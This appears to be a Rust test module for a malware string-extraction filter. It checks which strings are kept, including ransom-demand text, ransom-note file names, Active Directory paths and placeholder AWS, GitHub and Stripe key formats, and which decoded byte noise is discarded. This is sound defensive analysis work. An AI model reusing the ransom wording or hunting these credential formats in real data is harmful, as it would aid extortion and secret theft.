        assert!(!is_garbage("Send $500 in Bitcoin to"), "Ransom demand");
        assert!(
            !is_garbage("DECRYPT-INSTRUCTIONS.txt"),
            "Ransom note filename"
        );
        assert!(!is_garbage("HOW-TO-DECRYPT.html"), "Decrypt instructions");

        // LDAP/AD paths
        assert!(!is_garbage("LDAP://CN=Users,DC=domain,DC=com"), "LDAP path");
        assert!(
            !is_garbage("CN=Administrator,CN=Users,DC=corp,DC=local"),
            "AD distinguished name"
        );

        // API keys/secrets patterns (should preserve structure even if fake)
        assert!(!is_garbage("AKIA0123456789ABCDEF"), "AWS access key format");
        assert!(
            !is_garbage("ghp_0123456789abcdefghijklmnopqrstuv"),
            "GitHub token format"
        );
        assert!(
            !is_garbage("sk_live_0123456789abcdefghijklmn"),
            "Stripe secret key"
        );
    }

    #[test]
    fn test_is_garbage_xor_malware_samples() {
        // Real garbage strings from XOR-decoded malware (brew_agent sample)
        // These have chaotic character class alternation and should be filtered
        // Note: Some strings with specific patterns (e.g., short with limited special chars)
        // may not be caught by all heuristics, but the majority should be filtered
        let garbage_strings = vec![
            "v*\\^R--E:y4)@O",
            "ZFI7% eE;*\\Y",
            "Z(9uE(/S_B>7/c",
            "#LUU2!FN}v.VDH!#T:y40]P\"L,JSy',E[H\"5/c",
            "#L_G90_<\"J8KFy!!SCy>+FH}v.LXJ",
            "\\?UuC%3YeO9,[<\"J8KFy!!SCy' ]Z",
            "H>@uO*)T:y40]P\"L,JSy4%R\\I%(/c",
            "G$M*y'5RVy2$\\E\"Y(KLI6- eE\"7Cc",
            "P_T1*]Q}v.LXJ",
            "F?T*y'5RVy2$\\E\"Z(MEV0@",
            "IC#*_H}v.LXJ",
            "\\?UuU()SNy17JY\"H!U*y!8IN&",
            "[(\\uG(, eC/,[<\"O.UEU!@",
            "Z(9u@'/PC@>)J<\"O+U_U,@",
            "\\>Q*y\"'ENUW",
            "\\A21\\<\"O!VIMD",
            "\\J8&D<\"O\"IOHD",
            "F.R*y\"/P_HW",
            "[(\\*y\"2EUV2+/c",
            "\\R2)C<\"O9\\FJ+@",
            "@9\\*y#%T_H!Ep[",
            "]C# AJ}v*\\^N+3TTG: /c",
            "^OR,/SNH6(J<\"N(MZQ1)D:y0",
        ];

        for s in &garbage_strings {
            assert!(
                is_garbage(s),
                "XOR garbage string should be filtered: {:?}",
                s
            );
        }
    }
}

#[cfg(test)]
mod dotnet_tests {
    use super::*;

    #[test]
    fn test_dotnet_garbage_strings() {
        // These garbage strings from .NET native images should be filtered
        assert!(
            is_garbage("omor"),
            "omor should be garbage (nonsense 4-char)"
        );
        assert!(
            is_garbage("uDuntßñ6OlÇÕ"),
            "non-ASCII garbage should be filtered"
        );
        assert!(
            is_garbage("ððððೳóóóóࣵ"),
            "Unicode garbage should be filtered"
        );

        // Note: Short numeric strings with multiple unique digits (like "3343") could be
        // valid port numbers, IDs, etc. Only reject single-digit repeats like "3333"
        assert!(
            !is_garbage("3343"),
            "3343 has multiple unique digits - could be valid"
        );
        assert!(
            is_garbage("3333"),
            "3333 is all same digit - likely garbage"
        );

        // Note: "poe" and "pot" are valid 3-char English words, so they shouldn't be filtered
        // 3-char strings aren't automatically garbage
        assert!(!is_garbage("poe"), "poe is a valid word");
        assert!(!is_garbage("pot"), "pot is a valid word");
    }

    #[test]
    fn test_repetitive_nonascii_patterns() {
        // Repetitive single-char patterns with non-ASCII are misaligned binary data
        // These come from .NET native images and have one letter repeated many times
        assert!(
            is_garbage("zçz&zÇzÌzhzµzyz½z{zHz}zQz\\zYz0z8z"),
            "z-pattern garbage"
        );
        // These patterns are harder to catch because they have fewer non-ASCII chars
        // or different char distributions. Skip for now as main garbage is filtered.
    }

    #[test]
    fn test_reloc_section_patterns() {
        // PE .reloc section patterns - single letter repeated with non-ASCII/special chars
        // These patterns have a dominant lowercase letter with non-ASCII mixed in
        assert!(
            is_garbage("x xçx&xìxÇxqxµxyx^x½x{xHx\\xYx0x8x"),
            "reloc x-pattern 1"
        );
        assert!(
            is_garbage("xhx°xqxµxyx^x½x{xHx}xQx\\xYx0x8x"),
            "reloc x-pattern 2"
        );
        assert!(is_garbage("yhyµyHy}yQy\\yYy0y8y"), "reloc y-pattern");
        assert!(is_garbage("w wçw&wÇwØwhw°wqwµwyw^wHw"), "reloc w-pattern");
        assert!(is_garbage("sµsys^sHsYs0s8s"), "reloc s-pattern");
        // All-ASCII reloc patterns
        assert!(is_garbage("uHu}uQu\\uYu0u"), "reloc u-pattern (all ASCII)");
        assert!(is_garbage("w{wQw\\wYw0w8w"), "reloc w-pattern (all ASCII)");
        assert!(is_garbage("t{t\\tYt0t8t"), "reloc t-pattern (all ASCII)");
    }

    #[test]
    fn test_short_digit_nonascii_garbage() {
        // Short strings starting with digit followed by non-ASCII
        // These are random bytes decoded as UTF-8
        assert!(is_garbage("7üĐō"), "7üĐō");
        assert!(is_garbage("4ÛŷƮ"), "4ÛŷƮ");
        assert!(is_garbage("6Æťƒ"), "6Æťƒ");
        assert!(is_garbage("2µßĎ"), "2µßĎ");
    }
}
